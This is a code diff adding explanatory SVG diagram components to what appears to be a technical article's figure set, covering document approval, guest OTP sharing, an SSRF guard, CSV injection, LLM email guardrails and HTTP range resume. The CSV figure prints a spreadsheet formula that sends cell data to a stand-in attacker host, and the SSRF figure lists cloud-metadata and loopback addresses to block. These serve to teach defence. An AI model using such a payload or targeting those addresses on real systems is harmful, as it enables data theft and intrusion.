@@ -1776,6 +1776,400 @@ export function FigHttpRanges() {
   );
 }
 
+/* Diagram helpers --------------------------------------------------------------------------------------------- */
+function Box({
+  x,
+  y,
+  w,
+  h,
+  title,
+  sub,
+  tone = color.ink,
+  fill = color.surface,
+}: {
+  x: number;
+  y: number;
+  w: number;
+  h: number;
+  title: string;
+  sub?: string;
+  tone?: string;
+  fill?: string;
+}) {
+  return (
+    <g>
+      <rect x={x} y={y} width={w} height={h} rx={12} fill={fill} stroke={tone === color.ink ? color.line : tone} strokeWidth={2} />
+      <text x={x + w / 2} y={y + (sub ? h / 2 - 6 : h / 2 + 9)} fill={tone} fontSize={26} fontFamily={sans} textAnchor="middle">
+        {title}
+      </text>
+      {sub && (
+        <text x={x + w / 2} y={y + h / 2 + 26} fill={color.muted} fontSize={19} fontFamily={sans} textAnchor="middle">
+          {sub}
+        </text>
+      )}
+    </g>
+  );
+}
+
+function Arrow({
+  x1,
+  y1,
+  x2,
+  y2,
+  label,
+  tone = color.faint,
+  dy = -12,
+}: {
+  x1: number;
+  y1: number;
+  x2: number;
+  y2: number;
+  label?: string;
+  tone?: string;
+  dy?: number;
+}) {
+  const ang = Math.atan2(y2 - y1, x2 - x1);
+  const hx = (d: number, a: number) => x2 - d * Math.cos(ang + a);
+  const hy = (d: number, a: number) => y2 - d * Math.sin(ang + a);
+  return (
+    <g>
+      <line x1={x1} y1={y1} x2={x2} y2={y2} stroke={tone} strokeWidth={2.5} />
+      <polygon points={`${x2},${y2} ${hx(14, 0.45)},${hy(14, 0.45)} ${hx(14, -0.45)},${hy(14, -0.45)}`} fill={tone} />
+      {label && (
+        <text x={(x1 + x2) / 2} y={(y1 + y2) / 2 + dy} fill={color.muted} fontSize={18} fontFamily={sans} textAnchor="middle">
+          {label}
+        </text>
+      )}
+    </g>
+  );
+}
+
+/* 36. Approval states ------------------------------------------------------------------------------------------ */
+export function FigApprovalStates() {
+  return (
+    <Frame kicker="Approval state machine · one active review per document" title="Only the last approval moves what readers get">
+      <svg width={1456} height={580} viewBox="0 0 1456 580">
+        <Box x={0} y={40} w={220} h={100} title="Draft" sub="rev-2, scanned" />
+        <Arrow x1={220} y1={90} x2={300} y2={90} label="submit" />
+        <rect x={300} y={10} width={560} height={160} rx={16} fill="none" stroke={color.line} strokeDasharray="8 8" />
+        <text x={320} y={40} fill={color.muted} fontSize={19} fontFamily={sans}>
+          In review (template copied at submit)
+        </text>
+        <Box x={325} y={60} w={200} h={90} title="Step 1" sub="Engineering" />
+        <Arrow x1={525} y1={105} x2={635} y2={105} label="approve" />
+        <Box x={635} y={60} w={200} h={90} title="Step 2" sub="Maintenance" />
+        <Arrow x1={860} y1={90} x2={960} y2={90} label="approve" tone={color.accent} />
+        <Box x={960} y={40} w={300} h={100} title="Approved" sub="effective = rev-2" tone={color.accent} fill={color.accentDim} />
+        <Arrow x1={580} y1={170} x2={580} y2={260} tone={color.warm} />
+        <text x={596} y={222} fill={color.muted} fontSize={18} fontFamily={sans}>
+          return at any step, with a reason
+        </text>
+        <Box x={440} y={260} w={280} h={90} title="Returned" sub="history kept, review ends" tone={color.warm} />
+        <text x={0} y={420} fill={color.ink} fontSize={26} fontFamily={sans}>
+          What readers get, the whole time:
+        </text>
+        <rect x={0} y={445} width={960} height={56} rx={10} fill={color.surface} stroke={color.line} />
+        <text x={24} y={482} fill={color.ink} fontSize={25} fontFamily={mono}>
+          rev-1 · rev-1 · rev-1 · rev-1 (draft, review, return or retry)
+        </text>
+        <rect x={960} y={445} width={300} height={56} rx={10} fill={color.accentDim} stroke={color.accent} />
+        <text x={984} y={482} fill={color.accent} fontSize={25} fontFamily={mono}>
+          rev-2
+        </text>
+        <text x={0} y={550} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Each decision sends (review, step, version). Wrong step or stale version: 409. Wrong department or the submitter: 403.
+        </text>
+      </svg>
+    </Frame>
+  );
+}
+
+/* 37. Guest OTP flow -------------------------------------------------------------------------------------------- */
+export function FigOtpFlow() {
+  const steps: [string, string[], string][] = [
+    ["Employee shares", ["one approved revision", "one email address"], color.ink],
+    ["Invite link", ["random token", "only its digest stored", "expires in 7 days"], color.ink],
+    ["Guest asks for code", ["sent only to the", "invited address", "60 s resend cooldown"], color.ink],
+    ["Guest enters it", ["5 tries, 10 minutes", "used once, then gone"], color.accent],
+    ["15-minute session", ["secure, HTTP-only", "same-origin cookie"], color.accent],
+    ["Every download", ["share still active?", "still approved?", "sharer still allowed?"], color.accent],
+  ];
+  const w = 216;
+  return (
+    <Frame kicker="Guest file sharing · the whole flow" title="The code proves the inbox; every download is checked again">
+      <svg width={1456} height={560} viewBox="0 0 1456 560">
+        {steps.map(([t, sub, tone], i) => {
+          const x = i * (w + 32);
+          const y = i % 2 === 0 ? 40 : 210;
+          return (
+            <g key={t}>
+              <rect
+                x={x}
+                y={y}
+                width={w}
+                height={150}
+                rx={12}
+                fill={tone === color.accent ? color.accentDim : color.surface}
+                stroke={tone === color.ink ? color.line : tone}
+                strokeWidth={2}
+              />
+              <text x={x + 14} y={y + 40} fill={tone} fontSize={23} fontFamily={sans}>
+                {t}
+              </text>
+              {sub.map((line, j) => (
+                <text key={line} x={x + 14} y={y + 74 + j * 25} fill={color.muted} fontSize={18} fontFamily={sans}>
+                  {line}
+                </text>
+              ))}
+              {i < steps.length - 1 && <Arrow x1={x + w} y1={y + 75} x2={x + w + 32} y2={i % 2 === 0 ? 285 : 135} />}
+            </g>
+          );
+        })}
+        <text x={0} y={430} fill={color.warm} fontSize={24} fontFamily={sans}>
+          What fails, with the same "invalid or expired code" every time:
+        </text>
+        <text x={0} y={470} fill={color.ink} fontSize={22} fontFamily={sans}>
+          a forwarded link without the inbox · a reused or replaced code · the 6th guess · a code for another share
+        </text>
+        <text x={0} y={518} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Revoking the share or removing the employee's access stops the next request, even mid-download.
+        </text>
+      </svg>
+    </Frame>
+  );
+}
+
+/* 38. SSRF pipeline --------------------------------------------------------------------------------------------- */
+export function FigSsrfPipeline() {
+  return (
+    <Frame kicker="SSRF guard · where each check runs" title="Three checkpoints, and redirects go back through all of them">
+      <svg width={1456} height={580} viewBox="0 0 1456 580">
+        <Box x={0} y={60} w={210} h={100} title="User's URL" sub="untrusted" />
+        <Arrow x1={210} y1={110} x2={260} y2={110} />
+        <Box x={260} y={50} w={270} h={120} title="1. Parse" sub="new URL(), http(s) only" tone={color.accent} />
+        <Arrow x1={530} y1={110} x2={580} y2={110} />
+        <Box x={580} y={50} w={270} h={120} title="2. IP literal?" sub="check it now" tone={color.accent} />
+        <Arrow x1={850} y1={110} x2={900} y2={110} />
+        <Box x={900} y={50} w={300} h={120} title="3. Connect" sub="DNS answers checked, all" tone={color.accent} />
+        <Arrow x1={1200} y1={110} x2={1250} y2={110} />
+        <Box x={1250} y={60} w={200} h={100} title="Response" />
+        <path d="M 1350 160 L 1350 300 L 395 300 L 395 178" fill="none" stroke={color.warm} strokeWidth={2.5} />
+        <polygon points="395,170 386,186 404,186" fill={color.warm} />
+        <text x={870} y={290} fill={color.warm} fontSize={21} fontFamily={sans} textAnchor="middle">
+          3xx with Location: start again at 1 (redirect: "manual", max 5 hops)
+        </text>
+        <text x={260} y={380} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Catches
+        </text>
+        <text x={260} y={414} fill={color.ink} fontSize={21} fontFamily={mono}>
+          file:, gopher:
+        </text>
+        <text x={260} y={444} fill={color.muted} fontSize={19} fontFamily={sans}>
+          and turns 0x7f.1 into 127.0.0.1
+        </text>
+        <text x={580} y={380} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Catches
+        </text>
+        <text x={580} y={414} fill={color.ink} fontSize={21} fontFamily={mono}>
+          127.0.0.1
+        </text>
+        <text x={580} y={444} fill={color.ink} fontSize={21} fontFamily={mono}>
+          169.254.169.254
+        </text>
+        <text x={580} y={474} fill={color.ink} fontSize={21} fontFamily={mono}>
+          [::ffff:7f00:1]
+        </text>
+        <text x={920} y={380} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Catches (hostnames)
+        </text>
+        <text x={920} y={414} fill={color.ink} fontSize={21} fontFamily={mono}>
+          localhost, internal names
+        </text>
+        <text x={920} y={444} fill={color.ink} fontSize={21} fontFamily={mono}>
+          DNS rebinding
+        </text>
+        <text x={0} y={540} fill={color.muted} fontSize={21} fontFamily={sans}>
+          IP literals never reach DNS, so check 2 is not optional; DNS answers can change, so check 3 runs at connect time.
+        </text>
+      </svg>
+    </Frame>
+  );
+}
+
+/* 39. CSV in a spreadsheet ------------------------------------------------------------------------------------- */
+export function FigCsvSheet() {
+  const sheet = (x: number, title: string, b2: string, b2tone: string, note: string, noteTone: string) => (
+    <g>
+      <text x={x} y={30} fill={color.muted} fontSize={21} fontFamily={sans}>
+        {title}
+      </text>
+      {["", "A", "B"].map((h, i) => (
+        <g key={h + i}>
+          <rect x={x + [0, 60, 300][i]} y={50} width={[60, 240, 360][i]} height={44} fill={color.surface} stroke={color.line} />
+          <text x={x + [30, 180, 480][i]} y={79} fill={color.muted} fontSize={19} fontFamily={sans} textAnchor="middle">
+            {h}
+          </text>
+        </g>
+      ))}
+      {[
+        ["1", "Company", "Notes"],
+        ["2", "Acme Valves", b2],
+      ].map((row, r) => (
+        <g key={row[0]}>
+          {row.map((c, i) => (
+            <g key={i}>
+              <rect x={x + [0, 60, 300][i]} y={94 + r * 56} width={[60, 240, 360][i]} height={56} fill="none" stroke={color.line} />
+              <text
+                x={x + [30, 72, 312][i]}
+                y={130 + r * 56}
+                fill={i === 2 && r === 1 ? b2tone : color.ink}
+                fontSize={i === 0 ? 19 : 22}
+                fontFamily={i === 2 && r === 1 ? mono : sans}
+                textAnchor={i === 0 ? "middle" : "start"}
+              >
+                {c}
+              </text>
+            </g>
+          ))}
+        </g>
+      ))}
+      <text x={x} y={260} fill={noteTone} fontSize={22} fontFamily={sans}>
+        {note}
+      </text>
+    </g>
+  );
+  return (
+    <Frame kicker="The same scraped cell, opened in a spreadsheet" title="Escaping decides whether a cell is text or a program">
+      <svg width={1456} height={560} viewBox="0 0 1456 560">
+        {sheet(0, "Exported as is", "Click", color.accent, "A link: clicking sends A2 (and more) to evil.example", color.warm)}
+        {sheet(760, "Escaped: '= and quoted", '=HYPERLINK("http…', color.ink, "Plain text: nothing runs, nothing is sent", color.accent)}
+        <text x={0} y={360} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Cell value in the CSV
+        </text>
+        <text x={0} y={398} fill={color.ink} fontSize={21} fontFamily={mono}>
+          =HYPERLINK("http://evil.example?x="&amp;A2,"Click")
+        </text>
+        <text x={760} y={360} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Written by the fixed escaper
+        </text>
+        <text x={760} y={398} fill={color.ink} fontSize={21} fontFamily={mono}>
+          "'=HYPERLINK(""http://evil…"")"
+        </text>
+        <text x={0} y={490} fill={color.muted} fontSize={21} fontFamily={sans}>
+          Numbers are left alone: -42 stays a number a SUM can add. Excel can drop the quote prefix if the file is saved and reopened.
+        </text>
+      </svg>
+    </Frame>
+  );
+}
+
+/* 40. Guardrail pipeline --------------------------------------------------------------------------------------- */
+export function FigGuardrailPipeline() {
+  return (
+    <Frame kicker="LLM outreach drafts · from facts to a reviewed email" title="Facts in, checks after, a person before anything is sent">
+      <svg width={1456} height={580} viewBox="0 0 1456 580">
+        <Box x={0} y={60} w={240} h={130} title="Website facts" sub="F1, F2… with source URL" />
+        <Arrow x1={240} y1={125} x2={290} y2={125} />
+        <Box x={290} y={60} w={220} h={130} title="LLM draft" sub="must return cited IDs" />
+        <Arrow x1={510} y1={125} x2={560} y2={125} />
+        <rect x={560} y={20} width={380} height={210} rx={14} fill={color.surface} stroke={color.accent} strokeWidth={2} />
+        <text x={580} y={58} fill={color.accent} fontSize={24} fontFamily={sans}>
+          Rule checks
+        </text>
+        {["banned claims (met, discussed…)", "numbers not in the facts", "at least one real fact ID", "hypothesis hedged (may, could)"].map(
+          (t, i) => (
+            <text key={t} x={580} y={100 + i * 34} fill={color.ink} fontSize={21} fontFamily={sans}>
+              · {t}
+            </text>
+          )
+        )}
+        <Arrow x1={940} y1={125} x2={1000} y2={125} label="pass" tone={color.accent} />
+        <Box x={1000} y={60} w={220} h={130} title="Human review" sub="approve, edit, reject" tone={color.accent} fill={color.accentDim} />
+        <Arrow x1={1220} y1={125} x2={1270} y2={125} />
+        <Box x={1270} y={75} w={180} h={100} title="Sent" />
+        <Arrow x1={750} y1={230} x2={750} y2={320} tone={color.warm} />
+        <text x={766} y={282} fill={color.muted} fontSize={18} fontFamily={sans}>
+          fail
+        </text>
+        <Box x={600} y={320} w={300} h={100} title="Retry once" sub="with the reasons listed" tone={color.warm} />
+        <path d="M 640 320 L 640 270 L 400 270 L 400 202" fill="none" stroke={color.warm} strokeWidth={2.5} />
+        <polygon points="400,192 391,208 409,208" fill={color.warm} />
+        <text x={420} y={262} fill={color.muted} fontSize={18} fontFamily={sans}>
+          new draft
+        </text>
+        <Arrow x1={600} y1={385} x2={310} y2={385} label="fails again" tone={color.warm} />
+        <Box x={0} y={335} w={310} h={100} title="Insufficient evidence" sub="saved, never sent" tone={color.warm} />
+        <text x={0} y={510} fill={color.muted} fontSize={21} fontFamily={sans}>
+          In the test, the checks caught 7 of 7 obvious violations and missed 5 paraphrases: the human step is not optional.
+        </text>
+      </svg>
+    </Frame>
+  );
+}
+
+/* 41. Range resume --------------------------------------------------------------------------------------------- */
+export function FigRangeResume() {
+  const bar = (y: number, segs: [number, number, string, string][], label: string) => (
+    <g>
+      <text x={0} y={y + 34} fill={color.muted} fontSize={21} fontFamily={sans}>
+        {label}
+      </text>
+      {segs.map(([a, b, tone, t]) => (
+        <g key={a}>
+          <rect x={300 + a * 1.1} y={y} width={(b - a) * 1.1} height={52} fill={tone} stroke={color.bg} strokeWidth={3} rx={6} />
+          <text
+            x={300 + ((a + b) / 2) * 1.1}
+            y={y + 33}
+            fill={tone === color.line || tone === color.warmDim ? color.muted : color.bg}
+            fontSize={19}
+            fontFamily={mono}
+            textAnchor="middle"
+          >
+            {t}
+          </text>
+        </g>
+      ))}
+    </g>
+  );
+  return (
+    <Frame kicker="A 1,000-byte drawing, downloaded over a bad connection" title="Resume with Range, and If-Range stops a spliced file">
+      <svg width={1456} height={580} viewBox="0 0 1456 580">
+        {bar(
+          20,
+          [
+            [0, 300, color.accent, "0-299 ✓"],
+            [300, 600, color.accent, "300-599 ✓"],
+            [600, 1000, color.line, "connection drops"],
+          ],
+          "First attempt"
+        )}
+        {bar(
+          110,
+          [
+            [600, 900, color.accent, "Range: 600-899"],
+            [900, 1000, color.accent, "900-"],
+          ],
+          "Resume (same ETag)"
+        )}
+        {bar(200, [[0, 1000, color.accent, "4 parts, SHA-256 matches the original"]], "Result")}
+        <line x1={300} x2={1400} y1={300} y2={300} stroke={color.line} />
+        {bar(
+          330,
+          [
+            [0, 600, color.warm, "old file, bytes 0-599"],
+            [600, 1000, color.warmDim, "new file, 600-999?"],
+          ],
+          "Without If-Range"
+        )}
+        {bar(420, [[0, 1000, color.accent, "file changed: server sends all of it again (200)"]], "With If-Range")}
+        <text x={0} y={540} fill={color.muted} fontSize={21} fontFamily={sans}>
+          If-Range: "send the range only if the file still has this ETag, otherwise send the whole file".
+        </text>
+      </svg>
+    </Frame>
+  );
+}
+
 export const figures = [
   { id: "fig-passport-ocr-vs-nfc", component: FigOcrVsNfc },
   { id: "fig-kyc-data-retention", component: FigKycRetention },
@@ -1812,4 +2206,10 @@ export const figures = [
   { id: "fig-csv-injection", component: FigCsvInjection },
   { id: "fig-outreach-guardrails", component: FigOutreachGuardrails },
   { id: "fig-http-ranges", component: FigHttpRanges },
+  { id: "fig-approval-states", component: FigApprovalStates },
+  { id: "fig-otp-flow", component: FigOtpFlow },
+  { id: "fig-ssrf-pipeline", component: FigSsrfPipeline },
+  { id: "fig-csv-sheet", component: FigCsvSheet },
+  { id: "fig-guardrail-pipeline", component: FigGuardrailPipeline },
+  { id: "fig-range-resume", component: FigRangeResume },
 ] as const;
